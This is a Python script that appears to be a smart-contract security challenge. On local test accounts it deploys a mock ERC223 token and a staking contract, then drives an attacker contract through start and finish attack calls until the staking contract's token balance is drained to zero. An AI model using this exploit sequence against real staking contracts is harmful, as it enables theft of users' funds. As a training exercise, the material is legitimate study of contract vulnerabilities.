from ape import accounts, project
from .utils.helper import time_travel, w3

ONE_ETHER = w3.to_wei(1, "ether")
FIFTY_ETHER = w3.to_wei(50, "ether")
REWARD_AMOUNT = w3.to_wei(0.1, "ether")


def deploy(deployer):
    deploy_tokens = w3.to_wei(10000, "ether")

    # deploy ERC223 token
    print("\n--- Deploying MockERC223 ---\n")
    token = project.MockERC223.deploy(deploy_tokens, sender=deployer)
    assert token.balanceOf(deployer.address) == deploy_tokens

    # deploy staking contract
    print("\n--- Deploying Staking Contract ---\n")
    staking = project.Staking.deploy(
        token.address,
        REWARD_AMOUNT,
        value=(FIFTY_ETHER * 5),
        sender=deployer,
    )
    assert staking.token() == token.address
    assert staking.balance == FIFTY_ETHER * 5

    return token, staking


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    user_1 = accounts.test_accounts[1]
    attacker = accounts.test_accounts[2]

    # get token and exchange
    token, staking = deploy(deployer)

    print(f"\n--- ERC223 Token: {token.address}---\n")
    print(f"\n--- Staking contract: {staking.address}---\n")

    token.transfer(user_1.address, FIFTY_ETHER * 10, sender=deployer)
    token.transfer(attacker.address, FIFTY_ETHER, sender=deployer)

    # user 1 staking in the contract
    token.transfer(staking.address, FIFTY_ETHER * 10, sender=user_1)

    # define initial balances for attacker and staking contract
    attacker_initial_bal = token.balanceOf(attacker.address) / 10**18
    staking_initial_bal = token.balanceOf(staking.address) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Staking Contract: {staking_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.StakingAttacker.deploy(staking.address, sender=attacker)
    # transfer tokens to attack contract
    token.transfer(attacker_contract, token.balanceOf(attacker), sender=attacker)
    # start attack
    attacker_contract.start_attack(sender=attacker)
    # time travel 7 days so we can unstake
    time_travel(60 * 60 * 24 * 7)
    # finish attack
    attacker_contract.finish_attack(sender=attacker)

    # --- AFTER EXPLOIT --- #

    # define final balances for attacker and staking contract
    attacker_final_bal = token.balanceOf(attacker.address) / 10**18
    staking_final_bal = token.balanceOf(staking.address) / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Staking Contract: {staking_final_bal}\n---\n"
    )

    assert token.balanceOf(staking.address) == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
